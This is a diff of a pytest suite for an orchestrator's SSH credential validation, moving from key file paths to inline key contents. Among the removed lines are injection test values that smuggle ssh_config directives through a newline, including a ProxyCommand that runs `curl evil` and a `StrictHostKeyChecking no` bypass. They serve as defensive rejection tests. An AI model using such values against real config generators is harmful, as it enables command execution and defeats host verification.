@@ -18,7 +18,7 @@ from orchestrator.config import core_schema
 from orchestrator.config import validate as core_validate
 from orchestrator.marker import VCOWS_NS
 from orchestrator.problems import Problem
-from tests.conftest import errors, messages, wheres
+from tests.conftest import KNOWN_HOSTS, SSH_KEY, errors, messages, wheres
 from tests.fake_backend import FakeBackend
 
 
@@ -201,32 +201,33 @@ def test_a_good_uri_passes(cfg):
     assert not [p for p in errors(schema.validate(cfg)) if "uri" in p.where]
 
 
-# -- credential paths -------------------------------------------------------
+# -- credentials, which are contents rather than paths ----------------------
 
 
-def test_a_missing_credential_path_warns_and_does_not_refuse(cfg):
-    """`validate` is the offline phase and runs anywhere. These are paths on
-    whichever machine runs the deploy, normally the container, where they are
-    bind-mounted at run time -- so their absence here is not an answer."""
-    cfg["target"]["libvirt"]["ssh_keyfile"] = "/nowhere/id_ed25519"
-    cfg["target"]["libvirt"]["known_hosts"] = "/nowhere/known_hosts"
+def test_the_credentials_themselves_pass_and_say_nothing(cfg):
+    """The ordinary case, and the vacuity guard for the refusal below: a check
+    that rejects a path has to accept what replaced it."""
     problems = schema.validate(cfg)
     assert errors(problems) == [], messages(problems)
-    assert "/nowhere/id_ed25519 does not exist here" in messages(problems)
-    assert [p.where for p in problems if "does not exist here" in p.message] == [
-        "target.libvirt.ssh_keyfile",
-        "target.libvirt.known_hosts",
-    ], "one warning per field, each naming its own"
+    assert not [p for p in problems if p.where.startswith("target.libvirt.ssh")]
 
 
-def test_a_credential_path_that_exists_warns_about_nothing(cfg, tmp_path):
-    key = tmp_path / "id_ed25519"
-    key.write_text("")
-    known = tmp_path / "known_hosts"
-    known.write_text("")
-    cfg["target"]["libvirt"]["ssh_keyfile"] = str(key)
-    cfg["target"]["libvirt"]["known_hosts"] = str(known)
-    assert not [p for p in schema.validate(cfg) if "does not exist" in p.message]
+@pytest.mark.parametrize(
+    ("field", "value"),
+    [
+        ("ssh_key", "/run/secrets/id_ed25519"),
+        ("known_hosts", "/run/secrets/known_hosts"),
+    ],
+)
+def test_a_path_where_the_credential_belongs_is_refused_by_name(cfg, field, value):
+    """The one shape every config written against v0.1 has, and there is no
+    compatibility for it. `known_hosts` carries no pattern of its own, so
+    without this an absolute path reaches `ssh` as a known_hosts file holding a
+    single nonsense line -- and fails at the host key check, naming neither."""
+    cfg["target"]["libvirt"][field] = value
+    problems = errors(schema.validate(cfg))
+    assert wheres(problems) == [f"target.libvirt.{field}"], messages(problems)
+    assert "not a path" in messages(problems)
 
 
 # -- R-G: firmware settings are not changeable after creation ---------------
@@ -814,8 +815,8 @@ def test_credentials_never_reach_the_uri():
             # not fail: `connection_uri` never *adds* credentials, so deleting the
             # strip passed it.
             "uri": "qemu+ssh://vcows@vcows/system?no_verify=1",
-            "ssh_keyfile": "/run/secrets/id_ed25519",
-            "known_hosts": "/run/secrets/known_hosts",
+            "ssh_key": SSH_KEY,
+            "known_hosts": KNOWN_HOSTS,
         }
     )
     assert "?" not in uri
@@ -825,36 +826,39 @@ def test_credentials_never_reach_the_uri():
     assert "no_verify" not in uri
 
 
-# -- the credential paths ---------------------------------------------------
+# -- the credentials, through the composed core schema ----------------------
 
 
-@pytest.mark.parametrize("key", ["ssh_keyfile", "known_hosts"])
-@pytest.mark.parametrize(
-    "value",
-    [
-        "/run/secrets/k\n  ProxyCommand /bin/sh -c 'curl evil'",
-        "/run/secrets/k\n  StrictHostKeyChecking no",
-        "/run/secrets/k\n",
-        "/run/secrets/k\tHost *",
-        "relative/path",
-        "",
-    ],
-)
-def test_a_credential_path_that_is_not_a_plain_path_is_rejected(
-    cfg, registry, key, value
-):
-    """These two are interpolated verbatim into ~/.ssh/config by the container
-    entrypoint. A newline appends directives: `ProxyCommand` reaches command
-    execution, and `StrictHostKeyChecking no` undoes R-D from the other side."""
-    cfg["target"]["libvirt"][key] = value
-    assert errors(core_validate(cfg, registry)), f"{key}={value!r} was accepted"
+#: What `ssh_key` is not. The last is the whole reason there is a pattern rather
+#: than a `minLength`: a public key is what an operator reaches for by habit, it
+#: is not a secret, and it authenticates nothing.
+NOT_A_PRIVATE_KEY = [
+    "/run/secrets/id_ed25519",
+    "id_ed25519",
+    "",
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleNotAKey vcows@host",
+]
 
 
-@pytest.mark.parametrize("key", ["ssh_keyfile", "known_hosts"])
-def test_an_ordinary_credential_path_passes(cfg, registry, key):
+@pytest.mark.parametrize("value", NOT_A_PRIVATE_KEY)
+def test_something_that_is_not_a_private_key_is_rejected(cfg, registry, value):
+    """`ssh_key` carries the key itself, so the check is that it opens like one.
+    The entrypoint writes it to a file and hands the file to `ssh`, which would
+    otherwise fail with `invalid format` and name no config field."""
+    cfg["target"]["libvirt"]["ssh_key"] = value
+    assert errors(core_validate(cfg, registry)), f"{value!r} was accepted"
+
+
+def test_an_ordinary_key_and_known_hosts_pass(cfg, registry):
     """A validator that rejects everything passes half a suite."""
-    cfg["target"]["libvirt"][key] = "/home/vcows/.ssh/id_ed25519-vcows.pub"
     assert errors(core_validate(cfg, registry)) == []
+
+
+def test_an_empty_known_hosts_is_rejected(cfg, registry):
+    """It has no pattern -- a host key line is `host algo base64` with any
+    algorithm name -- so `minLength` is the whole of what can be said here."""
+    cfg["target"]["libvirt"]["known_hosts"] = ""
+    assert errors(core_validate(cfg, registry))
 
 
 # -- defaults ---------------------------------------------------------------
